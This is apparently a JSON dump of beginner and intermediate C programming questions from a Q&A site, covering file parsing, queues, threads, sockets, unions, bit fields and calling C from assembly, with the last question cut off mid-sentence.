{"count":74943,"tag":"c++","questions":[{"tags":["c","homework","io","queue"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13281326,"title":"Reading files and manipulate queues","body":"<p>So I am trying to write this function, read_deck, which is: </p>\n\n<p><strong>void read_deck(char *filename, queue *deck)</strong></p>\n\n<p>This function takes a character string of a file name. It opens the file filename for reading. It then reads cards one at a time into the queue deck so that the order tin which they appear in the file is identical to the order they appear in the queue. Cards are read until the end of a file is reached at which point the file is closed and the function returns.</p>\n\n<p><strong>int main(int argc, char **argv)</strong></p>\n\n<p>Main will set up the queue deck and use read_deck to fill it up with cards from the file designated by the first command line argument. It will then print the deck size and all cards in it (functions length and print_list) will be useful for this. </p>\n\n<p>My program currently : not done and not sure how to approach it further</p>\n\n<pre><code>   #include \"libcardlist.h\"\n#include &lt;stdio.h&gt;\n\nvoid read_deck(char *filename, queue *deck);\n\n\nint main(int argc, char **argv){\n\n    char *filename = argv[1];\n    FILE *f = fopen(filename, \"r\"); // open file\n    char buf[1024]; \n    stack *deck = new_stack(); // new deck\n    int status;\n    card cards;\n\n    //how to set up the queue\n    read_deck(  f , deck  ); // what would be the fields here?\n\n\n\n\n}\nvoid read_deck(char *filename, queue *deck){\n   int status;\n   card cards;\n  for (status = fscanf(f,\"%s\", buf); \n         status != EOF; \n         status = fscanf(f,\"%s\", buf))\n         {\n            fscanf (f,\"%d%c\", &amp;cards.face,&amp;cards.suit);\n            printf (\" %d%c\\n\",cards.face,cards.suit);\n         }\n}\n</code></pre>\n\n<p>for my current read_deck, it only prints every other card for some reason..\nThis is the desired output:</p>\n\n<pre><code>gcc p2.c libcardlist.c\nlila [program1]% cat smalldeck.cards \n14S\n2D\n13C\n10H\n5H\n11C\n13S\n4D\n13D\nlila [program1]% a.out smalldeck.cards\nDeck 9: 14S 2D 13C 10H 5H 11C 13S 4D 13D \n</code></pre>\n\n<p>mine output right now: </p>\n\n<pre><code> 2D\n 10H\n 11C\n 4D\n 4D\n</code></pre>\n\n<p>the libcardlist.c (correct)</p>\n\n<pre><code>/* This file contains functions to operate on a lists, stacks, and\n   queues of cards */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n/* Report an error and exit the program with a failure */\nvoid cardlist_error(char *msg){\n  fprintf(stderr,\"libcardlist: %s\\n\",msg);\n  exit(EXIT_FAILURE);\n}\n\n/* Basic type for a card */\ntypedef struct {\n  int face;         /* 2-14 */\n  char suit;            /* C H S D */\n} card;\n\n/* Convert a string like 14D into a card */\ncard str2card(char *buf){\n  card c;\n  sscanf(buf,\"%d%c\",&amp;c.face,&amp;c.suit);\n  return c;\n}\n\n/* Given a card c, put a string like 14D in buf representing it.  Good\n   for printing  */\nchar *card2str(card c, char *buf){\n  sprintf(buf, \"%d%c\", c.face, c.suit);\n  return buf;\n}\n\n/* Lists are of cards */\ntypedef card node_data;\n\n/* List Functions */\n\n/* Basic type for a list: data and next */\ntypedef struct node {\n  node_data data;\n  struct node *next;\n} node;\n\n/* Returns how many nodes are in a list */\nint length(node *l){\n  int n = 0;\n  while(l != NULL){\n    n++;\n    l = l-&gt;next;\n  }\n  return n;\n}\n\n/* Reverses a list, creates a fresh and distinct copy of the list */\nnode *reverse(node *l){\n  node *r = NULL;\n  while(l != NULL){\n    node *new = malloc(sizeof(node));\n    new-&gt;data = l-&gt;data;\n    new-&gt;next = r;\n    r = new;\n    l = l-&gt;next;\n  }\n  return r;\n}\n\n/* Print a list of cards to a file pointer */\nvoid print_list(node *l, FILE *f){\n  char buf[1024];       /* Use this for string conversion */\n  while(l != NULL){     /* Til end of list */\n    fprintf(f,\"%s \", card2str(l-&gt;data,buf)); /* Convert to string and print */\n    l = l-&gt;next;                 /* Advance to next */\n  }\n  fprintf(f,\"\\n\");\n}\n\n\n/* Stack functions */\n\n/* Basic type for a stack */\ntypedef struct stack {\n  node *top;\n} stack;\n\n/* Make a new stack: allocate memory and set its top pointer to\n   initially be NULL for an empty stack */\nstack *new_stack(){\n  stack *s = malloc(sizeof(stack));\n  s-&gt;top = NULL;\n  return s;\n}\n\n/* Return 1 if the stack is empty and 0 otherwise  */\nint stack_empty(stack *s){\n  return s-&gt;top == NULL;\n}\n\n/* Push something on the top of the stack */\nvoid stack_push(stack *s, node_data p){\n  node *new = malloc(sizeof(node)); /* New node for the new data */\n  new-&gt;data = p;            /* New node gets the new data */\n  new-&gt;next = s-&gt;top;           /* new will be on top, point it at current top */\n  s-&gt;top = new;             /* new is on top now */\n}\n\n/* Remove the top element of the stack */\nvoid stack_pop(stack *s){\n  if(!stack_empty(s)){      /* If the stack is not empty */\n    node *remove = s-&gt;top;  /* Track what's being removed */\n    s-&gt;top = s-&gt;top-&gt;next;  /* Advance the top down one */\n    free(remove);       /* Get rid of the old top node */\n  }\n}\n\n/* Retrive data from the top of the stack */\nnode_data stack_top(stack *s){\n  if(!stack_empty(s)){      /* If the stack is not empty */\n    return (s-&gt;top-&gt;data);  /* Return the data */\n  }\n  else{             /* Otherwise there is an error */\n    cardlist_error(\"stack_top called on empty stack\");\n  }\n}\n\n/* Queue functions */\n\n/* Basic type for the queue data structure */\ntypedef struct queue {\n  node *front;          /* Front of the line */\n  node *rear;           /* Back of the line */\n} queue;\n\n/* Make a new queue which is initially empty */\nqueue *new_queue(){\n  queue *q = malloc(sizeof(queue));\n  q-&gt;front = NULL;\n  q-&gt;rear = NULL;\n  return q;\n}\n\n/* Returns 1 if the queue is empty and 0 otherwise */\nint queue_empty(queue *q){\n  return q-&gt;front == NULL;\n}\n\n/* Add something to the front of the queue */\nvoid queue_add(queue *q, node_data p){\n  node *new = malloc(sizeof(node)); /* Adding a new node */\n  new-&gt;data = p;            /* Set new node's data */\n  new-&gt;next = NULL;         /* It will be the end of the line */\n  if(queue_empty(q)){       /* First node to be added */\n    q-&gt;front = new;     /* Front and back are new node */\n    q-&gt;rear = new;\n  }\n  else {            /* Not first node */\n    q-&gt;rear-&gt;next = new;    /* Current rear is second to last */\n    q-&gt;rear = new;      /* new guy is last */\n  }\n}\n\n/* Remove first element of the queue */\nvoid queue_remove(queue *q){\n  if(!queue_empty(q)){      /* If the queue is not empty */\n    node *remove = q-&gt;front;    /* Track who is being removed */\n    q-&gt;front = q-&gt;front-&gt;next;  /* Second in line is now at front */\n    free(remove);       /* Remove the old front */\n  }\n}\n\n/* Get the data for the front of the queue */\nnode_data queue_front(queue *q){\n  if(!queue_empty(q)){      /* If queue is not empty */\n    return (q-&gt;front-&gt;data);    /* Get data for front node */\n  }\n  else{             /* Otherwise this is an error */\n    cardlist_error(\"queue_front called on empty queue\");\n  }\n}\n</code></pre>\n\n<p>error: </p>\n\n<pre><code>segmentation fault\n</code></pre>\n"},{"tags":["c++","c","multithreading","recursion","brute-force"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13281539,"title":"Multithreading brute-force and recursive multidimensional loops. Another way?","body":"<p>I like figuring things out myself in terms of programming... So I was thinking of a method to loop through multi-dimensional arrays with dynamic dimensions. (mainly for things like brute force)</p>\n\n<p>The method I came up with to loop through arrays of unknown dimensions is as follows:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n/* a simple example of the method I'm using */\nvoid func(int *v,char *usable,int len,int D,int d)\n{\n  for(v[d] = 0; v[d] &lt; len; v[d]++)\n  {\n    if(d+1 &lt; D)\n      func(v,len,D,d+1);\n    else\n    {\n      for(int i = 0; i &lt; D; i++)\n        printf(\"%c\",usable[v[i]]);\n      printf(\"\\r\");\n    }\n  }\n}\nint main()\n{\n  int *v;\n  for(int z = 4; z &lt;= 6; z++) /* try 4 characters, try 5 characters, try 6 characters */\n  {\n    v = new int[z];\n    func(v,\"0123456789\",10,z,0);\n    printf(\"\\n\");\n    delete [] v;\n  }\n  return 0;\n}\n</code></pre>\n\n<p>I see this as a nice elegant solution but I've come up with more problems when thinking of multi-threading the process. I would like to know <strong>alternate solutions</strong> for this type of process that I haven't discovered, as well as <strong>possible ways of multi-threading</strong> a process like this. One method I tried was creating pre-determined <em>chunks</em> but because of the large amount of values that need to be processed when digits or usable characters increase are too big, they overflow any normal variables.</p>\n\n<p>One might ask: \"Why do you need to create a multithreading brute force.\" And I would reply that the ability to create a multithreaded brute force means the ability to multithread other processes like maze-solving and best-route determination.</p>\n\n<p>Thank you in advanced.</p>\n"},{"tags":["c","pointers","assembly","stack","cpu-registers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13281254,"title":"Parsing the Stack and Registers (EBP, EIP, ESP) and figuring out which function is related to each frame","body":"<p>So, supposing I have access to the registers of a program. I have access to esp, ebp and eip. eip is pointing to the next instruction that needs to be executed, ebp is pointing to another frame pointer and esp is pointing to the top of the stack. I understand this, however I don't understand the rest of the stack or how to parse it. </p>\n\n<p>For example, if I would like to get the local variables of a frame, should I just subtract <code>ebp - esp</code> (knowing that <code>ebp</code> is a bigger address than <code>esp</code>) and then go through those addresses and dereference them? Is this the proper way to get the local variables from that particular frame?</p>\n\n<p>Another question, what would be the best way to figure out which function is related to each frame? If I subtract 1 to the <code>ebp</code> address and then dereference that value, should I be getting the return address \"0x804...\"? What is the relationship between this address and the function? For example, if Foo() has a high pc address of <code>0x8045555</code> and a low pc address of <code>0x8045550</code>, is the return address that I would be getting going to be in between these addresses?</p>\n\n<p>Thanks a lot in advanced and let me know if I wasn't clear enough..</p>\n\n<p>NOTE: If someone has a better title suggest it, I didn't find a better one.</p>\n"},{"tags":["c","sockets","unix","tcp","stream"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13279024,"title":"Convert a uint16_t to char[2] to be sent over socket (unix)","body":"<p>I know that there are things out there roughly on this.. But my brains hurting and I can't find anything to make this work...</p>\n\n<p>I am trying to send an 16 bit unsigned integer over a unix socket.. To do so I need to convert a uint16_t into two chars, then I need to read them in on the other end of the connection and convert it back into either an unsigned int or an uint16_t, at that point it doesn't matter if it uses 2bytes or 4bytes (I'm running 64bit, that's why I can't use unsigned int :)</p>\n\n<p>I'm doing this in C btw</p>\n\n<p>Thanks </p>\n"},{"tags":["c","arguments"],"answer_count":8,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":7248,"score":6,"question_id":1706551,"title":"Parse string into argv/argc","body":"<p>Is there a C library function that I can use to parse a piece of text and obtain values for argv and argc, as if the text had been passed to an application on the command line? </p>\n\n<p>This doesn't have to work on Windows, just Linux - I also don't care about quoting of arguments.</p>\n"},{"tags":["c","windows","console-application"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13280895,"title":"How can I use colors in my console app (C)?","body":"<p>I am running C in <code>Code:Blocks</code> IDE with the compiler <code>GNU GCC</code>. And I want to use colorful string output in my console application. The OS I am on is Windows</p>\n\n<p>Previously, I used Borland C. So, using <code>textcolor()</code> <code>textbackground()</code> and <code>cprintf()</code> were fine. But these function does not seem to work on Code:Blocks IDE with GNU GCC Compiler wrapped with it. </p>\n\n<p>What should I do to print colored texts now? </p>\n"},{"tags":["c","linux","function","function-pointers"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13280384,"title":"Treat functions by name","body":"<p>Suppose you created a <code>main()</code> to deal with an exercise you asked your students.</p>\n\n<p>Every student is supposed to write their own function, with the same API. And a single file will be created, with all functions and the main calling them.</p>\n\n<p>Lets say: <code>int studentname(int a, int b)</code> is the function pattern.</p>\n\n<p>One way I deal with it was using a vector of pointer to functions <code>int (*func[MAX])()</code>. But you need to fulfill the vector one by one <code>func[0]=studentname;</code>.</p>\n\n<p>I wonder, is there a way a function can be called by its name somehow?</p>\n\n<p>Something like: <code>int student1(int a , int b)</code>, <code>student2()</code>, etc.</p>\n\n<p>And in <code>main</code> somehow we could just call <code>sscanf(funcname,\"student%d\",i); funcname();</code>.</p>\n\n<p>Do you have any other idea? Maybe</p>\n\n<pre><code>int studentname(int a, int b, char *fname)\n{\n    strcpy(fname, \"studentname\");\n</code></pre>\n\n<p>Anything creative will do! :)</p>\n\n<p>Thanks!\nBeco</p>\n\n<p>PS. I tried just a vector of functions, but C won't allow me! :)</p>\n\n<p><code>int func[2]()={{;},{;}};</code></p>\n\n<p>This way I could just give to each student a number, and voilá... But no way. It was funny though.</p>\n\n<hr>\n\n<p>Edited: I'm using linux.</p>\n\n<p>Edited 2: Thanks! I've accepted an answer that helped me, but I've also documented a complete example as an answer bellow.</p>\n"},{"tags":["c","arrays","fileinput"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13281073,"title":"reading from a file to create array minesweeper code","body":"<p>I'm having trouble with this assignment. I am supposed to create minesweeper-ish arrays. It reads in a file:</p>\n\n<pre><code>100\n3\n0 0\n2 1\n7 7\n10\n0 0\n0 1\n0 2\n0 3\n0 4\n0 5\n0 6\n0 7\n7 0\n7 1\n</code></pre>\n\n<p>the first line is the number of boards (100) the second line is the number of bombs in the board. the 2 integer lines are the row and column, respectively of the location of the bomb.</p>\n\n<p>my problem is it only prins out one board and my second question is how do i switch the 9 to a * in the board?</p>\n\n<p>thank you!</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define BOARD_SIZE 8\n#define BOMB 9\n\nint main() {\n\n    FILE *fp;\n\n    fp = fopen(\"mine.txt\",\"r\");\n\n    int numberBoards = 0;\n    int numberMines  = 0;\n    int col;\n    int row;\n    int currentBoard = 0;\n\n    // first row is going to be the number of boards\n    fscanf(fp,\"%d\",&amp;numberBoards);\n\n    while ( fscanf(fp,\"%d\",&amp;numberMines) &gt; 0 ) {\n            int i,j;\n            // start board with all zeros\n            int board[BOARD_SIZE][BOARD_SIZE] = { {0} };\n\n            currentBoard++;\n            printf(\"Board #%d:\\n\",currentBoard);\n\n            //Read in the mines and set them\n            for (i=0; i&lt;numberMines; i++) {\n                    fscanf(fp,\"%d %d\",&amp;col,&amp;row);\n                    board[col-1][row-1] = BOMB;\n            }\n\n            //mine proximity\n            for (i=0; i&lt;BOARD_SIZE; i++) {\n                    for (j=0; j&lt;BOARD_SIZE; j++) {\n                            if ( board[i][j] == BOMB ) {\n                                    //Square to the left\n                                    if (j &gt; 0 &amp;&amp; board[i][j-1] != BOMB) {\n                                            board[i][j-1]++;\n                                    }\n                                    //Square to the right\n                                    if (j &lt; 0 &amp;&amp; board [i][j+1] !=BOMB){\n                                            board [i][j+1]++;\n                                    }\n\n                                    //Square to the top\n                                    if (i &gt; 0 &amp;&amp; board [i-1][j] !=BOMB) {\n                                            board [i-1][j]++;\n                                    }\n\n                                    //Square to the bottom\n                                    if ( i &lt; 0 &amp;&amp; board [i+1][j] !=BOMB){\n                                            board [i+1][j]++;\n                                    }\n\n\n                    }\n\n\n\n            }\n\n            //Print out the minesweeper board\n            for (i=0; i&lt;BOARD_SIZE; i++) {\n                    for (j=0; j&lt;BOARD_SIZE; j++) {\n                            printf(\"%d \",board[i][j]);\n                    }\n                    printf(\"\\n\");\n            }\n            printf(\"\\n\");\n    }\n    //Close the file.\n    fclose(fp);\n\n    return 0;\n}\n}\n</code></pre>\n"},{"tags":["c","multithreading","random","posix"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1925,"score":5,"question_id":133546,"title":"Is reading /dev/urandom thread-safe?","body":"<p>This is the code:</p>\n\n<p><code><pre>\n  unsigned int number;\n  FILE* urandom = fopen(\"/dev/urandom\", \"r\");\n  if (urandom) {\n    size_t bytes_read = fread(&amp;number, 1, sizeof(number), urandom);\n    DCHECK(bytes_read == sizeof(number));\n    fclose(urandom);\n  } else {\n    NOTREACHED();\n  }\n</pre></code></p>\n\n<p>If not, how do I make it thread-safe?</p>\n"},{"tags":["c","linux","for-loop","segmentation-fault","printf"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":53,"score":1,"question_id":13280732,"title":"Segfault when NOT using printf","body":"<p>I am using POSIX threads, and at the end of my program, I am waiting to join each of the threads.  After some time of running perfectly well, my code started returning a weird bug when I was waiting for the threads.</p>\n\n<pre><code>pthreads threads[C+P];\n\nfor(i = 0; i &lt; (C+P); i++)\n{\n    printf(\"%d\\n\", i);  \n    pthread_join(threads[i]);\n}\n</code></pre>\n\n<p>If I remove the printf statement, or replace it with any other printf statement, a delay, or any other operation on i, I still get a segfault.  </p>\n\n<p>How would I start debugging this?</p>\n"},{"tags":["c","function","scope"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13280424,"title":"Array changed in a void function, is still changed outside! why? (scope)","body":"<p>This is a simple implementation of a sort algorithm. My question is. The array <code>numbers</code>, is declared and initialized in main. Then, I pass it like an argument in the function <code>sort</code> (Is a copy ?). Inside the <code>sort</code> function, <code>numbers</code>, now called <code>array</code> (a copy, as far as I know), is changed (sorted). So, why, after calling the function, the array <code>numbers</code> is changed (this is what I want, buy want to know why??. <code>array</code> scope is in <code>sort</code>, not <code>main</code>.</p>\n\n<pre><code>int main(void)\n{\n    int numbers[SIZE] = { 4, 15, 16, 50, 8, 23, 42, 108 };\n    for (int i = 0; i &lt; SIZE; i++)\n        printf(\"%d \", numbers[i]);\n    printf(\"\\n\");\n\n    sort(numbers, SIZE);\n\n    for (int i = 0; i &lt; SIZE; i++)\n        printf(\"%d \", numbers[i]);\n    printf(\"\\n\");\n    return 0;\n}\nvoid sort(int array[], int size)\n{\n    int swaps = 0;\n\n    while(swaps==0)\n    {\n        for(int i = 0; i &lt; size ; i++)\n        {\n            for(int j = i + 1; j &lt; size ; j++)\n            {\n                if( array[i] &gt; array[j] )\n                {\n                    // Swapping\n                    int temp = array[i]; \n                    array[i] = array[j];\n                    array[j] = temp;\n\n                    swaps ++;\n                }   \n            }\n        }\n    }    \n}\n</code></pre>\n"},{"tags":["c","gcc","int64"],"answer_count":3,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":85,"score":7,"question_id":13275136,"title":"Which initializer is appropriate for an int64_t?","body":"<p>I like to initialize my variables to some \"dummy\" value and have started to use <code>int64_t</code> and <code>uint64_t</code>. So far, it looks like there are at least three ways I could initialize an <code>int64_t</code> to a particular value (and with slight changes for the unsigned equivalent):</p>\n\n<pre><code>int64_t method_one   = 0;\nint64_t method_two   = 0LL;\nint64_t method_three = INT64_C(0);\n</code></pre>\n\n<p>I use GCC and target OS X and Linux. I'd like to pick a method that aims for ease of portability and clarity — but correctness, above all. Am I overthinking this, or is there a \"best\" or \"most recommended\" approach for initializing this variable type, for any particular value I throw at it (which is within its bounds, of course)?</p>\n"},{"tags":["c","linux","character-encoding"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13280620,"title":"How to set run-time character set in C?","body":"<p>How to set run-time character set in the C programming language, in linux environment?</p>\n\n<p>For example, I want to set it to iso8859-1, utf-8, or ascii.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":176,"score":0,"question_id":10301600,"title":"Geodesic distance between two points","body":"<p>Is there a library in C that can calculate the geodesic distance between two points?</p>\n"},{"tags":["c","linux","errno"],"answer_count":11,"favorite_count":5,"up_vote_count":14,"down_vote_count":0,"view_count":14377,"score":14,"question_id":503878,"title":"How to know what the errno means?","body":"<p>When calling execl(...) I get an errno=2. What does it mean ? How can I know the meaning of this errno ? </p>\n"},{"tags":["c","thread-safety","openmp","race-condition","particle"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":42,"score":3,"question_id":13277505,"title":"Optimal parallelisation of communication from randomly distributed particles to regular grid","body":"<p>I am working on parallelizing my particle-in-cell code which I use to do simulations of deformation within the earth in 2D and 3D. Several routines of the code are easy to parallelize using OpenMP and scale very well. However, I have run into problems in a crucial part of the code that deals with interpolation from particles to a grid cells. The particles are moving around for each iteration (according to a velocity field). Many calculations are most effecient to perform on a regular, non-deforming grid. Therefore, each iteration involves communication from \"randomly\"  distributed particles to the grid cells.</p>\n\n<p>The problem can be illustrated in the following simplified 1D code:</p>\n\n<pre><code>//EXPLANATION OF VARIABLES (all previously allocated and initialized, 1D arrays)\n//double *markerval; // Size Nm. Particle values. Are to be interpolated to the grid\n//double *grid; // Size Ng=Nm/100 Grid values. \n//uint *markerpos; // Size Nm. Position of particles relative to grid (each particle\n// knows what grid cell it belongs to) possible values are 0,1,...Ng-1\n\n//#pragma omp parallel for schedule(static) private(e)\nfor (e=0; e&lt;Nm; e++) {\n    //#pragma omp atomic\n    grid[markerpos[e]]+=markerval[e];\n}\n</code></pre>\n\n<p>The particle positions are random in the worst case scenario, but typically, particles neighboring each other in memory, also neighbor each other in space and hence also in grid memory.</p>\n\n<p>How do I parallelize this procedure efficiently? Several particles map to the same grid cell, so there is a nonzero chance of race conditions and cache swapping if the above loop is directly parallelized. Making the update atomic prevents race conditions, but makes the code much slower than the sequential case.</p>\n\n<p>I also tried to make a private copy of grid values for each thread and then add them up subsequently. This, however, probably requires too much memory in the code to be used, and for this example, it did not scale so well with the number of threads (for reasons of which I am uncertain).</p>\n\n<p>A third option might be to map from the grid to the particles and then loop through grid indices instead of particle indices. However, this, I fear, would be quite involved and require a major change of the code, and I am uncertain how much it would help, since it would also require the use of sort routines which would be computationally expensive as well.</p>\n\n<p>Has anybody got any experience with this or a similar problem?</p>\n"},{"tags":["c","parsing","io","stack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13280135,"title":"Using fget and parsing","body":"<p>So I want to read a file, and i should have 4 functions:\nit is the main function</p>\n\n<pre><code>/* Queue functions */\n\n/* Basic type for the queue data structure */\ntypedef struct queue {\n  node *front;          /* Front of the line */\n  node *rear;   \n\n    /* Back of the line */\n} queue;\n</code></pre>\n\n<hr>\n\n<p>Sorry, I compiled wrongly, it works now.</p>\n"},{"tags":["c++","c","opengl","mandelbrot"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13254149,"title":"zooming mandelbrot set second time doesnot let it zoom in desired place","body":"<p>I am using opengl/c++ to draw mandelbrot set and trying to zoom into. I am able to zoom for the first time and zooms where i want (by clicking), but when i try to zoom next time it does not zoom where i intended to zoom instead it shift and zoom little bit far from the place i want to zoom. \nI use </p>\n\n<pre><code>#include &lt;GL/gl.h&gt;\n#include &lt;GL/glu.h&gt;\n#include &lt;GL/glut.h&gt;\n#include &lt;math.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ndouble dividecubesby  = 700;\ndouble left = -2.0;\ndouble right = 2.0;\ndouble bottom = -2.0;\ndouble top = 2.0;\nint maxiteration = 128;\nint zoomlevel = 3;\ndouble baseSize = 4.0;\ndouble SizeReal;\ndouble SizeImage;\ndouble xco=0.0;\ndouble yco=0.0;\n\n    void   SetXYpos(int px,int py)\n    {\n        xco = left+(right-left)*px/dividecubesby;\n        yco = top-(top-bottom)*py/dividecubesby\n    }\n\n   void keyPressed(unsigned char key, int x, int y)\n   {\n\n       int xx= x;\n       int yy= y;\n       setXYpos(xx,yy);\n\n\n       SizeReal = (pow(2.0, (-zoomlevel)))*baseSize;\n       SizeImage = (pow(2.0, (-zoomlevel)))*baseSize;\n\n\n\n       switch(key){\n\n       case 'z':\n\n      left   =  xco- (SizeReal/2);\n      right  =  xco + (SizeReal/2);\n      bottom = yco - (SizeReal/2);\n      top    = yco + (SizeReal/2);\n      dividecubesby = dividecubesby+500;        \n      maxiteration  = maxiteration+500; \n      zoomlevel=zoomlevel+1;\n\n      glutPostRedisplay();\n      break;\n      }\n\n  }\n\n    int mandtest(double Cr, double Ci)\n {\n\n\n    double Zr = 0.0;\n    double Zi = 0.0;\n    int times = 0;\n    double temp;\n    Zr = Zr+Cr;\n    Zi = Zi+Ci;\n\n    while ((((Zr*Zr)+(Zi*Zi))&lt;=4) &amp;&amp; (times &lt; maxiteration)){\n\n       temp = (Zr*Zr)-(Zi*Zi);\n       Zi = 2*Zr*Zi;\n\n       Zr = temp+Cr;\n       Zi = Zi+Ci;                 \n\n       times = times+1;  \n\n\n    }\n\n  return times;\n\n}\n\n\n        void display(void)\n {\n\n    glClear(GL_COLOR_BUFFER_BIT);\n    glColor3f(1.0f,1.0f,1.0f);\n    double deltax = ((right - left)/(dividecubesby-1));\n    double deltay = ((top- bottom)/(dividecubesby-1));\n\n    glMatrixMode(GL_PROJECTION);\n    glLoadIdentity();\n\n    gluOrtho2D(left,right,bottom,top);\n\n\n    glBegin(GL_POINTS);\n\n    for(double x= left;x&lt;=right;x += deltax ){\n        for(double y= bottom; y&lt;=top;y +=  deltay ){\n        if((mandtest(x,y))==maxiteration){\n            glColor3f(1.0f,1.0f,1.0f); \n            glVertex2f(x,y);\n\n        }\n        else {\n        glColor3f((float)mandtest(x,y)/10,0.0f,(float)mandtest(x,y)/30);\n                    glVertex2f(x,y);\n            }\n\n        }\n     }\n    glEnd();\n\nglFlush();\n}\n</code></pre>\n\n<p>to calculate where the mouse is clicked interms of the cartesian co-ordinate [-2,2]</p>\n\n<p>px and py are pixel coordinate </p>\n"},{"tags":["c","unions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":65,"score":-2,"question_id":12999598,"title":"Structure within union and bit field","body":"<pre><code>#include &lt;stdio.h&gt;\n\nunion u\n{\n    struct st\n    {\n        int i : 4;\n        int j : 4;\n        int k : 4;\n        int l;\n    } st;\n    int i;\n } u;\n\nint main()\n{\n    u.i = 100;\n      printf(\"%d, %d, %d\", u.i, u.st.i, u.st.l);\n}\n</code></pre>\n\n<p>I'm trying to figure out the output of program. The first outputs <code>u.i = 100</code> but I can't understand the output for <code>u.st.i</code> and <code>u.st.l</code>. Please also explain bit fields.</p>\n"},{"tags":["c","struct","unions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13037832,"title":"Union in Struct Error","body":"<p>I have the following struct:</p>\n\n<pre><code>struct type1 {\n    struct type2 *node;\n    union element {\n        struct type3 *e;\n        int val;\n    };\n};\n</code></pre>\n\n<p>When initialising a pointer <code>*f</code> that points to an instance of <code>type1</code> and doing something like:\n<code>f.element-&gt;e</code> or even just <code>f.element</code>, I get: </p>\n\n<pre><code>error: request for member ‘element’ in something not a structure or union\n</code></pre>\n\n<p>What am I overseeing here?</p>\n"},{"tags":["c","struct","unions"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13242401,"title":"A reused named struct as a nested struct triggers a redefinition error in GCC","body":"<p>This is a contrived example, but expresses the core problem.  I have a union and a structure with the same nested structure from an existing code base:</p>\n\n<pre><code>typedef union _MyUnion\n{\n  unsigned int A;\n  struct _MyNestedStruct\n  {\n    int field\n  } MyNestedStruct;\n} MyUnion;\n</code></pre>\n\n<p>and</p>\n\n<pre><code>typedef struct _MyStruct\n{\n  struct _MyNestedStruct\n  {\n    int field\n  } MyNestedStruct;\n} MyStruct;\n</code></pre>\n\n<p>If I compile this under the Green Hills Compiler (GHC), then there are no problems.  Compiling under GCC gives the error \"error: redefinition of 'struct _MyStruct'\".</p>\n\n<p>First of all, why was I able to successfully compile with a named structure as a nested structure?  I suspect that GHC is compiling with some C++ rules, or it supports named structures in a nested structure.</p>\n\n<p>Second, what would allow me to successfully compile without any significant code changes?  I know I can just delete the _MyNestedStruct from the nested structure, but does this have any consequences?</p>\n"},{"tags":["c","embedded","malloc"],"answer_count":13,"favorite_count":6,"up_vote_count":18,"down_vote_count":0,"view_count":3983,"score":18,"question_id":2241006,"title":"What are alternatives to malloc() in C?","body":"<p>I am writing C for an MPC 555 board and need to figure out how to allocate dynamic memory without using malloc. </p>\n"},{"tags":["c","assembly","binary"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":505,"score":1,"question_id":6182314,"title":"How to run a C binary from Assembly code?","body":"<p>I have this code in Assembly that I want to open a C program, passing a parameter and after the execution of this C program, a value is returned to my Assembly program.</p>\n\n<p>More specifically, this:</p>\n\n<ul>\n<li>Open a C program passing a String as parameter.</li>\n<li>The C program will convert this String into a float and return it</li>\n<li>I'll catch this float and use it as I need in my assembly program.</li>\n</ul>\n\n<pre>\n[ASM]                 // Executing Assembly code\n     \\------------->  // Run C Program passing a value as parameter\n      [C Program]     // Do Stuff\n     /------------->  // Return value that I can catch back in my Assembly code\n[ASM]                 // Goes back to executing Assembly code using value the \n                      // value received by the C program.\n</pre>\n\n<p>Important info: I'm on Linux, and am not sure of what is my C binary. *.out maybe? Could use a few pointers on that too.</p>\n\n<p>P.S: I'm aware of all the floating point instructions and the countless other options I have for doing that all in Assembly, but it's for my Computer Architecture and Organization class and that's how I need it to be.</p>\n\n<p>Thanks everyone.</p>\n\n<p><strong>EDIT: Let me explain it a little better.</strong></p>\n\n<p>I have compiled this C code into a file called Convert and placed it into the same folder as my Assembly (.s) code:</p>\n\n<pre><code>//#includes\nint main(int argc, char* argv[]){\n\n    float fVal;\n    sscanf(argv[1], \"%f\", &amp;fVal);\n\n    return fVal;\n}\n</code></pre>\n\n<p>Via Assembly, I want to execute Convert passing a string as \"3.1415\" as parameter.\nConvert will convert it to float and return.</p>\n\n<p>Via Assembly, I'll then POP that from the stack and use the Float 3.1415.</p>\n\n<p>All I have in mind is something like a System Call:</p>\n\n<pre><code>push   parameter\npush   Executable's name\nsys                     ! to wake the system to run my executable\n\npop    eax              ! pop the Float returned by Convert to EAX\n</code></pre>\n\n<p>Hope it's 